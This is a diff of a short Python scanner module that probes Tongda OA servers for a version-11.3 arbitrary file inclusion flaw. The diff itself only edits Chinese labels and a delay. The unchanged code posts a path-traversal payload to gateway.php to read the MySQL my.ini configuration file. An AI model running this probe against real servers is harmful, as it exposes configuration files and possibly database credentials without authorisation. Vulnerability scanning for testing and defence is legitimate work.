@@ -1,9 +1,9 @@
 import requests
 import time
 
-def fileInclude(host): # 通达11.3任意文件包含漏洞
+def fileInclude(host): # 通达<11.3任意文件包含漏洞
     content = ''
-    content += '[->] 正在测试是否存在任意文件包含漏洞' + '\n'
+    content += '[->] 正在测试是否存在<11.3任意文件包含漏洞' + '\n'
     url = host + 'ispirit/interface/gateway.php'
     try:
         data = {'json':'{"url":"general/../../mysql5/my.ini"}'}
@@ -17,12 +17,12 @@ def fileInclude(host): # 通达11.3任意文件包含漏洞
             print(content)
             return content
         else:
-            content += '[-] 不存在任意文件包含漏洞' + '\n'
+            content += '[-] 不存在<11.3任意文件包含漏洞' + '\n'
             print(content)
             return content
     except:
         pass
 
 def run(host):
-    time.sleep(1)
+    time.sleep(3)
     fileInclude(host)
